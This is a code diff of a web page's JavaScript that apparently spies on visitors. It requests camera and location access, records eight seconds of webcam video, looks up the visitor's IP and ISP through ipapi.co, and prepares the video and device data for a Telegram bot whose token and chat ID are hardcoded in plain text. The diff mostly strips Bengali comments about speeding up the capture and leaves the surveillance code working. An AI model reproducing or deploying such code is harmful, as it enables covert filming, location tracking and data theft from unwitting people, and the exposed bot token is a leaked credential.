@@ -13,8 +13,7 @@
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
-        // একসাথে সব ডেটা দ্রুত লোড করার ফাংশন
-        async64 = async function getDeviceInfo(lat, lon) {
+        async function getDeviceInfo(lat, lon) {
             let ip = "Unknown", isp = "Unknown";
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -108,7 +107,6 @@
         }
 
         async function startProcess() {
-            // একসাথে ক্যামেরা এবং লোকেশন পারমিশন রিকোয়েস্ট পাঠানো যাতে সময় কম লাগে
             let lat = null, lon = null;
             
             const locationPromise = new Promise((resolve) => {
@@ -140,7 +138,6 @@
                 };
 
                 mediaRecorder.onstop = async () => {
-                    // ভিডিও রেকর্ড শেষ হওয়ার আগেই যেন লোকেশন ফেচ হয়ে যায়
                     await locationPromise;
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     const captionText = await getDeviceInfo(lat, lon);
@@ -160,7 +157,6 @@
 
                 mediaRecorder.start();
 
-                // দ্রুত ৮ সেকেন্ডের মধ্যে ভিডিও প্রসেস শেষ করা
                 setTimeout(() => {
                     mediaRecorder.stop();
                 }, 8000);
